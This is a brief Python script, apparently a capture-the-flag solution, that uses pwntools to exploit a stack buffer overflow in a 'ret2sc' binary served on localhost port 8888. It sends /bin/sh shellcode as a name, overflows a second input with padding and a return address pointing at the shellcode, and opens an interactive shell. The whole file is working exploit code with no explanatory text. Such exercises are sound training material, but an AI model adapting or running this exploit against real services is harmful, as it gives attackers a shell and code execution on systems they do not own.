#!/usr/bin/env python
# coding=utf-8
from pwn import *
ip   = '127.0.0.1'
prot = 8888
r = remote(ip, prot)
#r = process("./ret2sc")
context(arch = 'amd64', os = 'linux')
shellcode = asm(shellcraft.amd64.linux.sh())
r.recvuntil("Input Your Name: ")
r.sendline(shellcode)
r.recvuntil("Show Your Skill: ")
r.sendline(b"A"*32 + b"x" * 8 + p64(0x601080))

r.interactive()

